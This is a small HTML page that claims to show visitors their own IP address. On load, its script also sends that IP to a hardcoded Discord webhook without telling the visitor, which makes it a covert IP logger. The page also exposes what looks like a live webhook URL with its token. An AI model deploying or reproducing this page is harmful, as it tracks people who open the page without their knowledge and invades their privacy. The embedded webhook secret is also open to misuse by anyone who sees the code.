<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Your IP Address</title>
</head>
<body>
<h2>Your IP Address</h2>
<p id="ipDisplay">Loading your IP...</p>

<script>
  // ‚ö†Ô∏è Only use this webhook for testing in a private Discord channel you control.
  // Anyone who sees this HTML could use your webhook URL to post messages there.
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1434137186806005820/Lrf8JKjayqMQT2SYt2y-0WCSUSHHpOnJ5BGPiyc3ld6wI8RonJ0NrWcBzawpI65RQSMz";

  async function getIp() {
    try {
      // Step 1: Fetch your public IP
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      const ip = data.ip;

      document.getElementById('ipDisplay').textContent = 'Your IP is: ' + ip;
      console.log('Fetched IP:', ip);

      // Step 2: Send formatted message to Discord
      const payload = {
        content: `üåê Visitor IP detected: **${ip}**`
      };

      const webhookResponse = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!webhookResponse.ok) {
        throw new Error(`Discord returned ${webhookResponse.status}`);
      }

      console.log('‚úÖ IP sent to Discord successfully');
    } catch (error) {
      console.error('Error:', error);
      document.getElementById('ipDisplay').textContent = 'Error: ' + error.message;
    }
  }

  getIp();
</script>
</body>
</html>
